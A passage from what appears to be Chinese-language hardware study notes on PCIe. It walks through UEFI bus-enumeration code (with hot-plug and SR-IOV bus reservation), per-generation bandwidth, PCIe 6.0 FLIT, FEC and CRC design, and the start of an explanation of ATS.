PCI_BRIDGE_SUBORDINATE_BUS_REGISTER_OFFSET);\n        Status = PciRootBridgeIo-&gt;Pci.Write(PciRootBridgeIo, EfiPciWidthUint8,\n                                            Address, 1, &amp;Register);\n\n        Status = PciScanBus(PciDevice, SecondBus, SubBusNumber, PaddedBusRange);\n        if (EFI_ERROR(Status)) {\n          return Status;\n        }\n      }\n\n      //\n      // Set the current maximum bus number under the PPB\n      //\n      Address = EFI_PCI_ADDRESS(StartBusNumber, Device, Func,\n                                PCI_BRIDGE_SUBORDINATE_BUS_REGISTER_OFFSET);\n\n      Status = PciRootBridgeIo-&gt;Pci.Write(PciRootBridgeIo, EfiPciWidthUint8,\n                                          Address, 1, SubBusNumber);\n    } else {\n      //\n      // It is device. Check PCI IOV for Bus reservation\n      // Go through each function, just reserve the MAX ReservedBusNum for one\n      // device\n      //\n\n      // OMITTED\n    }\n\n    if ((Func == 0) &amp;&amp; !IS_PCI_MULTI_FUNC(&amp;Pci)) {\n      //\n      // Skip sub functions, this is not a multi function device\n      //\n\n      Func = PCI_MAX_FUNC;\n    }\n  }\n}\n</code></pre> <p>\u200b\u4ece\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u53bb\u6389\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u70ed\u63d2\u62d4\u200b\u76f8\u5173\u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u7b80\u5355\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u601d\u8def\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u679a\u4e3e\u200b\u5f53\u524d\u200b\u8bbe\u5907\u200b\u4e0b\u200b\u7684\u200b Device \u200b\u548c\u200b Function</li> <li>\u200b\u5982\u679c\u200b\u627e\u5230\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6865\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4e3a\u200b\u5b83\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b Bus Number<ol> <li>\u200b\u8bbe\u7f6e\u200b\u8fd9\u4e2a\u200b\u65b0\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\u7684\u200b Primary Bus Number \u200b\u4e3a\u200b Start Bus Number\uff08\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0a\u200b\u4e00\u7ea7\u200b\u7684\u200b Secondary Bus Number\uff09\uff0cSecondary Bus \u200b\u662f\u200b\u65b0\u200b\u5206\u914d\u200b\u7684\u200b Bus Number\uff0cSubordinate Bus Number \u200b\u662f\u200b\u6700\u5927\u503c\u200b</li> <li>\u200b\u8fd9\u6837\u200b\u8bbe\u7f6e\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u6240\u6709\u200b\u7684\u200b\u5728\u200b <code>[Secondary Bus Number, Max Bus Number]</code> \u200b\u8303\u56f4\u200b\u4e2d\u200b\u7684\u200b Bus \u200b\u8bf7\u6c42\u200b\u90fd\u200b\u4f1a\u200b\u8def\u7531\u200b\u5230\u200b\u65b0\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\u4e0a\u200b</li> <li>\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b PciScanBus\uff0c\u200b\u53c2\u6570\u200b\u662f\u200b\u65b0\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\uff0cStart Bus Number \u200b\u4e3a\u200b\u65b0\u200b\u7684\u200b Secondary Bus Number</li> <li>\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b\u8fd4\u56de\u200b\u4ee5\u540e\u200b\uff0c\u200b\u65b0\u200b\u7684\u200b\u6865\u200b\u8bbe\u5907\u200b\u4e0b\u9762\u200b\u6240\u6709\u200b\u7684\u200b\u8bbe\u5907\u200b\u90fd\u200b\u5206\u914d\u200b\u5230\u200b\u4e86\u200b\u81ea\u5df1\u200b\u7684\u200b Bus Number\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u77e5\u9053\u200b\u51c6\u786e\u200b\u7684\u200b Subordinate Bus Number \u200b\u4e86\u200b\uff0c\u200b\u4e0d\u518d\u200b\u662f\u200b\u521a\u624d\u200b\u4e34\u65f6\u200b\u8bbe\u7f6e\u200b\u7684\u200b Max Bus Number\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u65f6\u5019\u200b\u518d\u200b\u628a\u200b\u51c6\u786e\u200b\u7684\u200b Subordinate Bus Number \u200b\u5199\u5165\u200b\u6865\u200b\u8bbe\u5907\u200b\u7684\u200b Subordinate Bus Number \u200b\u4e2d\u200b</li> </ol> </li> <li>\u200b\u679a\u4e3e\u200b\u5b8c\u200b\u6240\u6709\u200b\u8bbe\u5907\u200b\u4ee5\u540e\u200b\uff0c\u200b\u8fd4\u56de\u200b\u76ee\u524d\u200b\u9012\u5f52\u200b\u5206\u914d\u200b\u5f97\u5230\u200b\u7684\u200b\u6700\u5927\u200b\u7684\u200b Bus Number</li> </ol> <p>\u200b\u8fd9\u6837\u200b\u6574\u7406\u51fa\u6765\u200b\u4e00\u770b\u200b\uff0c\u200b\u5176\u5b9e\u200b\u5f88\u200b\u6e05\u695a\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b DFS \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5728\u200b\u641c\u7d22\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u5f53\u524d\u200b\u7684\u200b\u7ed3\u70b9\u200b\u53ef\u200b\u8fbe\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u4ece\u200b Root Bridge \u200b\u5230\u200b\u5f53\u524d\u200b\u7684\u200b\u7ed3\u70b9\u200b\u8def\u5f84\u200b\u4e0a\u200b\u7684\u200b Bus Number \u200b\u8303\u56f4\u200b\u90fd\u200b\u662f\u200b <code>[Secondary Bus Number, Max Bus Number]</code>\uff1b\u200b\u5f53\u200b\u7ed3\u70b9\u200b\u641c\u7d22\u200b\u5b8c\u200b\u4ee5\u540e\u200b\uff0c\u200b\u518d\u200b\u56de\u6eaf\u200b\uff0c\u200b\u56de\u6eaf\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u77e5\u9053\u200b\u4e86\u200b\u5b9e\u9645\u200b\u5206\u914d\u200b\u5230\u200b\u591a\u200b\u5927\u200b\u7684\u200b Bus Number\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u518d\u200b\u586b\u56de\u200b Subordinate Bus Number\uff0c\u200b\u6700\u540e\u200b\u4fdd\u8bc1\u200b\u8fd9\u4e2a\u200b\u6811\u4e0a\u200b\u6bcf\u200b\u4e00\u5c42\u200b\u7684\u200b <code>[Secondary Bus Number, Subordinate Bus Number]</code> \u200b\u533a\u95f4\u200b\u4e0d\u200b\u91cd\u5408\u200b\uff0c\u200b\u4e14\u200b\u6bcf\u4e2a\u200b\u5b50\u200b\u7ed3\u70b9\u200b\u7684\u200b\u533a\u95f4\u200b\u90fd\u200b\u5305\u542b\u200b\u4e8e\u7236\u200b\u7ed3\u70b9\u200b\u7684\u200b\u533a\u95f4\u200b\u3002</p> <p>\u200b\u6700\u540e\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u7c7b\u4f3c\u200b MindShare \u200b\u4e66\u4e2d\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u56fe\u200b\uff1a</p> <p> </p> PCIe \u200b\u679a\u4e3e\u200b\u7ed3\u679c\u200b\uff08\u200b\u56fe\u6e90\u200b MineShare PCIe 3.0 \u200b\u4e66\u200b\uff09 <p>\u200b\u4e3a\u4e86\u200b\u652f\u6301\u200b PCIe \u200b\u70ed\u63d2\u62d4\u200b\uff0c\u200b\u6216\u8005\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u52a8\u6001\u200b\u4ea7\u751f\u200b\u65b0\u200b\u8bbe\u5907\u200b\u7684\u200b SR-IOV\uff0c\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u505a\u200b\u4e86\u200b\u76f8\u5e94\u200b\u7684\u200b\u9884\u7559\u200b\uff1a</p> <pre><code>if (FeaturePcdGet(PcdPciBusHotplugDeviceSupport)) {\n  //\n  // If Hot Plug is supported,\n  // Get the bridge information\n  //\n  BusPadding = FALSE;\n  if (gPciHotPlugInit != NULL) {\n    if (IsPciHotPlugBus(PciDevice)) {\n      //\n      // If it is initialized, get the padded bus range\n      //\n      Status = gPciHotPlugInit-&gt;GetResourcePadding(\n          gPciHotPlugInit, PciDevice-&gt;DevicePath, PciAddress, &amp;State,\n          (VOID **)&amp;Descriptors, &amp;Attributes);\n\n      if (EFI_ERROR(Status)) {\n        return Status;\n      }\n\n      BusRange = 0;\n      NextDescriptors = Descriptors;\n      Status = PciGetBusRange(&amp;NextDescriptors, NULL, NULL, &amp;BusRange);\n\n      FreePool(Descriptors);\n\n      if (!EFI_ERROR(Status)) {\n        BusPadding = TRUE;\n      } else if (Status != EFI_NOT_FOUND) {\n        //\n        // EFI_NOT_FOUND is not a real error. It indicates no bus number padding\n        // requested.\n        //\n        return Status;\n      }\n    }\n  }\n}\n\nif (FeaturePcdGet(PcdPciBusHotplugDeviceSupport) &amp;&amp; BusPadding) {\n  //\n  // Ensure the device is enabled and initialized\n  //\n  if ((Attributes == EfiPaddingPciRootBridge) &amp;&amp;\n      ((State &amp; EFI_HPC_STATE_ENABLED) != 0) &amp;&amp;\n      ((State &amp; EFI_HPC_STATE_INITIALIZED) != 0)) {\n    *PaddedBusRange = (UINT8)((UINT8)(BusRange) + *PaddedBusRange);\n  } else {\n    //\n    // Reserve the larger one between the actual occupied bus number and padded\n    // bus number\n    //\n    Status = PciAllocateBusNumber(PciDevice, SecondBus, (UINT8)(BusRange),\n                                  &amp;PaddedSubBus);\n    if (EFI_ERROR(Status)) {\n      return Status;\n    }\n\n    *SubBusNumber = MAX(PaddedSubBus, *SubBusNumber);\n  }\n}\n</code></pre> <p>SR-IOV:</p> <pre><code>//\n// It is device. Check PCI IOV for Bus reservation\n// Go through each function, just reserve the MAX ReservedBusNum for one device\n//\nif (PcdGetBool(PcdSrIovSupport) &amp;&amp; (PciDevice-&gt;SrIovCapabilityOffset != 0)) {\n  if (TempReservedBusNum &lt; PciDevice-&gt;ReservedBusNum) {\n    Status = PciAllocateBusNumber(\n        PciDevice, *SubBusNumber,\n        (UINT8)(PciDevice-&gt;ReservedBusNum - TempReservedBusNum), SubBusNumber);\n    if (EFI_ERROR(Status)) {\n      return Status;\n    }\n\n    TempReservedBusNum = PciDevice-&gt;ReservedBusNum;\n\n    if (Func == 0) {\n      DEBUG((DEBUG_INFO, \"PCI-IOV ScanBus - SubBusNumber - 0x%x\\n\",\n             *SubBusNumber));\n    } else {\n      DEBUG((DEBUG_INFO, \"PCI-IOV ScanBus - SubBusNumber - 0x%x (Update)\\n\",\n             *SubBusNumber));\n    }\n  }\n}\n</code></pre> <p>\u200b\u5206\u914d\u200b\u597d\u200b Bus \u200b\u4ee5\u540e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u6240\u6709\u200b\u8bbe\u5907\u200b\u8fdb\u884c\u200b Configuration Request \u200b\u4e86\u200b\uff0c\u200b\u540e\u7eed\u200b\u7684\u200b Memory \u200b\u548c\u200b IO \u200b\u5730\u5740\u200b\u7684\u200b\u5206\u914d\u200b\u548c\u200b\u8def\u7531\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u5730\u200b\u9012\u5f52\u200b\u5730\u200b\u8fdb\u884c\u200b\u5206\u914d\u200b\uff0c\u200b\u7136\u540e\u200b\u56de\u6eaf\u200b\u7684\u200b\u65f6\u5019\u200b\u5408\u5e76\u200b\u5730\u5740\u200b\u533a\u95f4\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"hardware/pcie.html#_5","title":"\u7269\u7406\u5c42","text":"<p>\u200b\u7269\u7406\u5c42\u200b\u7f16\u7801\u200b\u4e0a\u200b\uff0cPCIe 1.0 \u200b\u548c\u200b 2.0 \u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b NRZ 8b/10b\uff0cPCIe 3.0 \u200b\u5230\u200b 5.0 \u200b\u7528\u200b\u7684\u200b\u662f\u200b NRZ 128b/130b\uff0c\u200b\u6700\u65b0\u200b\u7684\u200b PCIe 6.0 \u200b\u548c\u200b 7.0 \u200b\u5219\u200b\u6362\u6210\u200b\u4e86\u200b PAM4 FLIT\u3002\u200b\u53ef\u4ee5\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u6bcf\u200b\u4e00\u4ee3\u200b x16 Lane \u200b\u60c5\u51b5\u200b\u4e0b\u200b\u7684\u200b\u6700\u5927\u200b\u6570\u636e\u200b\u5e26\u5bbd\u200b\uff1a</p> <ul> <li>PCIe 1.0: <code>2.5 * 8 / 10 * 16 = 32 Gb/s</code></li> <li>PCIe 2.0: <code>5.0 * 8 / 10 * 16 = 64 Gb/s</code></li> <li>PCIe 3.0: <code>8.0 * 128 / 130 * 16 = 126 Gb/s</code></li> <li>PCIe 4.0: <code>16.0 * 128 / 130 * 16 = 252 Gb/s</code></li> <li>PCIe 5.0: <code>32.0 * 128 / 130 * 16 = 504 Gb/s</code></li> <li>PCIe 6.0: <code>64.0 * 16 = 1024 Gb/s</code>\uff0c\u200b\u5982\u679c\u200b\u8003\u8651\u200b FLIT \u200b\u5f15\u5165\u200b\u7684\u200b\u5f00\u9500\u200b\uff0c\u200b\u5219\u200b\u662f\u200b <code>64.0 * 242 / 256 * 16 = 968 Gb/s</code></li> <li>PCIe 7.0: <code>128.0 * 16 = 2048 Gb/s</code>\uff0c\u200b\u5982\u679c\u200b\u8003\u8651\u200b FLIT \u200b\u5f15\u5165\u200b\u7684\u200b\u5f00\u9500\u200b\uff0c\u200b\u5219\u200b\u662f\u200b <code>128.0 * 242 / 256 * 16 = 1936 Gb/s</code></li> </ul>"},{"location":"hardware/pcie.html#pcie-60","title":"PCIe 6.0","text":"<p>PCIe 6.0 \u200b\u5f15\u5165\u200b\u4e86\u200b PAM4 \u200b\u6765\u200b\u66ff\u4ee3\u200b\u539f\u6765\u200b\u7684\u200b NRZ\uff0c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u6ce2\u7279\u7387\u200b\u4e0d\u53d8\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u901f\u5ea6\u200b\u7ffb\u500d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u518d\u200b\u4f7f\u7528\u200b 128b/130b\uff0c\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b PAM4 \u200b\u5e26\u6765\u200b\u7684\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u9519\u8bef\u7387\u200b\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b FEC\uff0cCRC \u200b\u8fd8\u6709\u200b\u683c\u96f7\u200b\u7801\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e3a\u4e86\u200b FEC \u200b\u5f15\u5165\u200b\u4e86\u200b FLIT\u3002</p> <p>\u200b\u7f51\u4e0a\u200b\u53ef\u4ee5\u200b\u641c\u200b\u5230\u200b\u5173\u4e8e\u200b PCIe \u200b\u7684\u200b PPT\uff1aPCIe\u00ae 6.0 Specification: The Interconnect for I/O Needs of the Future \u200b\u548c\u200b PCIE\u00ae 6.0 SPECIFICATION: A HIGH-PERFORMANCE I/O INTERCONNECT FOR ADVANCED NETWORKING APPLICATIONS\uff0c\u200b\u4ee5\u53ca\u200b\u5173\u4e8e\u200b FLIT \u200b\u7684\u200b\u535a\u5ba2\u200b\uff1aThe PCIe\u00ae 6.0 Specification Webinar Q&amp;A: A Deeper Dive into FLIT Mode, PAM4, and Forward Error Correction (FEC)\uff0c\u200b\u5173\u4e8e\u200b FEC \u200b\u548c\u200b CRC \u200b\u7684\u200b\u535a\u5ba2\u200b\uff1aPCIe 6.0 Verification of FEC and CRC</p> <p>\u200b\u603b\u7ed3\u200b FLIT (Flow Control Unit) \u200b\u7684\u200b\u8981\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u6bcf\u4e2a\u200b FLIT \u200b\u56fa\u5b9a\u200b\u957f\u5ea6\u200b 256 \u200b\u5b57\u8282\u200b\uff0c\u200b\u5176\u4e2d\u200b 236 \u200b\u5b57\u8282\u200b\u4f20\u8f93\u200b TLP\uff0c6 \u200b\u5b57\u8282\u200b\u4f20\u8f93\u200b DLLP\uff0c8 \u200b\u5b57\u8282\u200b\u4f20\u8f93\u200b CRC\uff0c6 \u200b\u5b57\u8282\u200b\u4f20\u8f93\u200b FEC\u3002\u200b\u56fa\u5b9a\u200b\u957f\u5ea6\u200b\u7684\u200b\u662f\u200b\u4e3a\u4e86\u200b\u4f7f\u7528\u200b FEC\uff08<code>FLIT mode is adopted for the PCIe 6.0 architecture because error correction needs to operate on fixed sized packets.</code>\uff09\u3002</li> <li>\u200b\u63a5\u53d7\u65b9\u200b\u63a5\u53d7\u200b\u5230\u200b FLIT \u200b\u540e\u200b\uff0c\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u8fdb\u884c\u200b FEC \u200b\u89e3\u7801\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5c1d\u8bd5\u200b\u4fee\u590d\u200b\u9519\u8bef\u200b\uff0c\u200b\u518d\u200b\u8fdb\u884c\u200b CRC \u200b\u6821\u9a8c\u200b\u3002\u200b\u5982\u679c\u200b\u4e2d\u9014\u200b\u51fa\u73b0\u200b\u4e86\u200b\u9519\u8bef\u200b\uff0c\u200b\u5219\u200b\u4f1a\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b NAK \u200b\u7ed9\u200b\u53d1\u9001\u200b\u65b9\u200b\uff08<code>After a FLIT is received, the receiving device performs the FEC decode, which corrects any correctable error within each FEC group. After the decode, the CRC check is performed. If the CRC check fails, the receiving device can indicate that the FLIT has not been successfully received by sending a NAK (no acknowledgment) back to the transmitting device.</code>\uff09\u3002\u200b\u53d1\u9001\u200b\u65b9\u4f1a\u200b\u91cd\u65b0\u200b\u53d1\u9001\u200b FLIT\uff08<code>The NAK causes a replay, resulting in the FLIT being replayed and delivered without any errors.</code>\uff09\u3002</li> <li>\u200b\u4e00\u4e2a\u200b TLP \u200b\u53ef\u80fd\u200b\u8de8\u8d8a\u200b\u591a\u4e2a\u200b FLIT\uff0c\u200b\u4e00\u4e2a\u200b FLIT \u200b\u53ef\u80fd\u200b\u5305\u62ec\u200b\u591a\u4e2a\u200b TLP\uff0c\u200b\u6839\u636e\u200b TLP \u200b\u5927\u5c0f\u200b\u800c\u5b9a\u200b\u3002TLP \u200b\u4e0d\u200b\u9700\u8981\u200b\u5bf9\u9f50\u200b\u5230\u200b FLIT \u200b\u7684\u200b\u5f00\u5934\u200b\u6216\u8005\u200b\u7ed3\u5c3e\u200b\uff08<code>One TLP can span over multiple FLITs and one FLIT can have multiple TLPs, depending on the size of the TLP. The 236 Bytes in each FLIT of 256 Bytes can be used to transfer a partial TLP, as well as one or more TLPs.</code>\uff09\u3002</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0cFLIT \u200b\u7684\u200b CRC \u200b\u7528\u200b\u4e86\u200b 8 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u539f\u6765\u200b TLP \u200b\u548c\u200b DLLP \u200b\u4e2d\u200b\u7684\u200b ECRC \u200b\u548c\u200b LCRC\u3002\u200b\u5728\u200b\u4e4b\u524d\u200b\u7684\u200b PCIe \u200b\u7248\u672c\u200b\uff0cTLP \u200b\u7684\u200b\u53ef\u9009\u200b Digest \u200b\u662f\u200b 4 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b ECRC\uff0cTLP+DLLP \u200b\u7684\u200b LCRC \u200b\u662f\u200b 4 \u200b\u5b57\u8282\u200b\u3002\u200b\u5177\u4f53\u200b\u91c7\u7528\u200b\u591a\u5c11\u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u548c\u200b\u76ee\u6807\u200b\u7684\u200b\u9519\u8bef\u7387\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u4f20\u8f93\u200b\u7684\u200b\u5b57\u8282\u6570\u200b\u76f8\u5173\u200b\u3002</p> <p>\u200b\u5177\u4f53\u200b\u5730\u200b\uff0cFLIT \u200b\u7684\u200b 6 \u200b\u5b57\u8282\u200b FEC \u200b\u5206\u4e3a\u200b\u4e09\u7ec4\u200b\uff0c\u200b\u6bcf\u7ec4\u200b 2 \u200b\u5b57\u8282\u200b\uff0c\u200b\u5206\u522b\u200b\u4fdd\u62a4\u200b\u4e09\u5206\u4e4b\u4e00\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u662f\u200b\u4ea4\u9519\u200b\u7684\u200b\uff08\u200b\u89c1\u200b\u4e0b\u56fe\u200b\u7684\u200b\u4e09\u79cd\u200b\u989c\u8272\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u989c\u8272\u200b\u5bf9\u5e94\u200b\u4e00\u7ec4\u200b FEC\uff09\uff0c\u200b\u6bcf\u200b\u4e00\u7ec4\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u9519\u8bef\u200b\uff08\u200b\u6839\u636e\u200b\u68c0\u9519\u200b\u7ea0\u9519\u7801\u200b\u7406\u8bba\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u7ea0\u6b63\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u6bcf\u7ec4\u200b\u9700\u8981\u200b\u989d\u5916\u200b 2 \u200b\u5b57\u8282\u200b\u7684\u200b ECC\uff09\u3002\u200b\u8fd9\u4e2a\u200b\u53eb\u505a\u200b 3-way interleaved ECC\u3002\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b lane \u200b\u4e0a\u200b\u51fa\u73b0\u200b\u8fde\u7eed\u200b 16 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff08\u200b\u4f8b\u5982\u200b Lane 0 \u200b\u7684\u200b\u5b57\u8282\u200b 0\u300116 \u200b\u548c\u200b 32 \u200b\u51fa\u9519\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u200b\u9519\u8bef\u200b\u7684\u200b\u8303\u56f4\u200b\u5728\u200b\u6bcf\u7ec4\u200b\u91cc\u200b\u6700\u200b\u591a\u200b\u5f71\u54cd\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\uff08\u200b\u84dd\u8272\u200b\u7ec4\u200b\u5f71\u54cd\u200b 0\uff0c\u200b\u9ec4\u8272\u200b\u7ec4\u200b\u5f71\u54cd\u200b 16\uff0c\u200b\u7eff\u8272\u200b\u7ec4\u200b\u5f71\u54cd\u200b 32\uff09\uff0c\u200b\u800c\u200b\u8fd9\u200b\u4e09\u7ec4\u200b\u5206\u522b\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6b63\u786e\u200b\u5730\u200b\u7ea0\u6b63\u9519\u8bef\u200b\uff08<code>The FEC is a 3-way interleaved ECC, with each ECC code capable of correcting a single Byte error. The interleaving is done so that a burst error of up to 16 bits in any Lane does not impact more than a Byte in each interleaved ECC code word.</code>\uff09\u3002\u200b\u56fe\u793a\u200b\u89c1\u200b\u4e0b\u200b\uff1a</p> <p> </p> PCIe FLIT 3-Way Interleave ECC \u200b\u56fe\u793a\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe 6.0 Verification of FEC and CRC\uff09 <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u662f\u200b 3 \u200b\u8fd9\u4e2a\u200b\u5947\u6570\u200b\u5462\u200b\uff1f\u200b\u56e0\u4e3a\u200b Lane \u200b\u7684\u200b\u4e2a\u6570\u200b\u662f\u200b 2 \u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u5982\u679c\u200b\u7528\u200b 3 \u200b\u7ec4\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6b63\u597d\u200b\u6bcf\u4e2a\u200b Lane \u200b\u4e0a\u200b\u8fde\u7eed\u200b\u7684\u200b\u5b57\u8282\u200b\u5bf9\u5e94\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b ECC \u200b\u5206\u7ec4\u200b\u3002\u200b\u518d\u5f80\u200b\u4e0a\u200b\uff0c5 \u200b\u7ec4\u200b ECC \u200b\u4e5f\u200b\u662f\u200b\u53ef\u4ee5\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/pcie.html#pcie-70","title":"PCIe 7.0","text":"<p>PCIe 7.0 \u200b\u5c1a\u672a\u200b\u6b63\u5f0f\u200b\u53d1\u5e03\u200b\uff0c\u200b\u76f8\u5173\u200b\u7684\u200b\u65b0\u95fb\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>PCIe 7.0 Specification, Version 0.9: Final Draft Now Available for Member Review</li> </ul>"},{"location":"hardware/pcie.html#ats","title":"ATS","text":"<p>ATS\uff08Address Translation Service\uff09\u200b\u662f\u200b\u5728\u200b PCIe \u200b\u4e0a\u200b\u7ed9\u200b\u5916\u8bbe\u200b\u63d0\u4f9b\u200b\u67e5\u8be2\u200b\u9875\u8868\u200b\u7684\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u4ece\u800c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u865a\u62df\u5730\u5740\u200b\u3002\u200b\u6807\u51c6\u200b\u53ef\u4ee5\u200b\u5728\u200b https://composter.com.ua/documents/ats_r1.1_26Jan09.pdf \u200b\u5904\u200b\u4e0b\u8f7d\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5173\u4e8e\u200b ATS \u200b\u7684\u200b PPT\uff1ahttps://composter.com.ua/documents/Address_Translation_Services.pdf\u3002</p> <p>\u200b\u5b83\u200b\u7684\u200b\u6574\u4f53\u200b\u5de5\u4f5c\u200b\u65b9\u5f0f\u200b\u5982\u56fe\u200b\uff1a</p> <p> </p> PCIe ATS \u200b\u5de5\u4f5c\u200b\u65b9\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe ATS \u200b\u6807\u51c6\u200b\uff09 <p>\u200b\u5c31\u662f\u200b\u5728\u200b Root Complex \u200b\u548c\u200b Memory \u200b\u4e4b\u95f4\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b Translation Agent\uff0c\u200b\u8d1f\u8d23\u200b\u67e5\u8868\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b Page Table Walker\u3002\u200b\u5b83\u4f1a\u200b\u63a5\u6536\u200b\u6765\u81ea\u200b PCIe \u200b\u8bbe\u5907\u200b\u7684\u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u7136\u540e\u200b\u5b83\u200b\u83b7\u53d6\u200b\u5230\u200b\u9875\u8868\u200b\u5730\u5740\u200b\u540e\u200b\uff0c\u200b\u6839\u636e\u200b\u865a\u62df\u5730\u5740\u200b\u53bb\u67e5\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u9875\u8868\u200b\u3002TLB\uff08\u200b\u5728\u200b\u6807\u51c6\u200b\u4e2d\u200b\u53eb\u505a\u200b Address Translation Cache\uff0cATC\uff09\u200b\u662f\u200b\u5b9e\u73b0\u200b\u5728\u200b PCIe \u200b\u8bbe\u5907\u200b\u4fa7\u200b\u7684\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u7edf\u4e00\u200b\u7684\u200b TLB\uff0c\u200b\u4e5f\u200b\u4e0d\u662f\u200b CPU \u200b\u6838\u5fc3\u200b\u7684\u200b TLB\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u652f\u6301\u200b ATS\uff0c\u200b\u9700\u8981\u200b\u652f\u6301\u200b\u5982\u4e0b\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff1a</p> <ol> <li>PCIe Device \u200b\u5411\u200b Translation Agent \u200b\u53d1\u9001\u200b Translation Request\uff1bTranslation Agent \u200b\u5411\u200b PCIe Device \u200b\u56de\u590d\u200b Translation Completion\uff1b</li> <li>\u200b\u5f53\u200b\u9875\u8868\u200b\u51fa\u73b0\u200b\u53d8\u5316\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u901a\u77e5\u200b PCIe \u200b\u8bbe\u5907\u200b\u7aef\u7684\u200b TLB\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u5411\u200b PCIe \u200b\u8bbe\u5907\u200b\u53d1\u9001\u200b Invalidate Request Message\uff1bPCIe \u200b\u8bbe\u5907\u200b\u5b8c\u6210\u200b TLB \u200b\u5237\u65b0\u200b\u540e\u200b\uff0c\u200b\u56de\u590d\u200b\u4e00\u4e2a\u200b Invalidate Complete Message\u3002</li> </ol> <p>ATS 